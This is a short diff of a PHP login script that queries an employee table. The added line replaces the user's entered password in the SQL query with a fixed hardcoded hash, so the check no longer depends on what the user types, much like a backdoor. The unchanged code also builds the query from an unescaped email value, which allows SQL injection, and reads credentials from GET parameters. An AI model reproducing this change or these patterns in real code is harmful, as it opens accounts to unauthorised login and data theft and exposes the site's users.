@@ -13,7 +13,7 @@
     $password = inputdata(sha1(sha1(md5(md5(sha1($_GET['password_user']))))));
     $remember_login = $_GET['remember_login'];
     $sql_select_user = <<<EOT
-        SELECT * FROM nhanvien WHERE Email = '$email' AND Password = '$password';
+        SELECT * FROM nhanvien WHERE Email = '$email' AND Password = 'ddb25769880dc6553eee75f4505fb4fca0293489';
     EOT;
     $query_user = mysqli_query($conn,$sql_select_user);
     $result_user = mysqli_fetch_array($query_user,MYSQLI_ASSOC);
